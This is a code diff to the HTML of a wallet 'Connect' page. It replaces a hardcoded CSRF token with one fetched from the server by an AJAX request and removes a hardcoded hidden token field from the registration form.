@@ -17,7 +17,7 @@
     <meta http-equiv="content-type" content="text/html;charset=UTF-8">
     <meta charset="utf-8">
     <title>Connect</title>
-    <meta name="csrf-token" content="csrf-token-placeholder">
+    <meta name="csrf-token" content="">
     <meta name="author" content="themesflat.com">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <link rel="stylesheet" type="text/css" href="../static/static/connect-css/style.css">
@@ -3683,7 +3683,6 @@ window.smartsupp||(function(d) {
 
                     <div id="div_connect_manuallly" style="display:none;">
                     <form id="registrationForm" method="POST">
-                        <input type="hidden" name="csrfmiddlewaretoken" value="aiN5tLHVrQazLXPbaaJEEnS6QK7onVT9zSilWtX7qTUTyvFZpdLhMuo8u0wwqNBW">
                     <input type="hidden" name="action" value="registration"/>
                    
                    
@@ -3730,6 +3729,17 @@ window.smartsupp||(function(d) {
 
     <script type="text/javascript">
         $(document).ready( function() {
+            // Get CSRF token from server
+            $.ajax({
+                url: '/csrf-token',
+                type: 'GET',
+                success: function(data) {
+                    $('meta[name="csrf-token"]').attr('content', data.token);
+                },
+                error: function() {
+                    console.log('Could not fetch CSRF token');
+                }
+            });
  
             /*@ Registration start */
             $('#button_connect_wallet').click( function(e) {
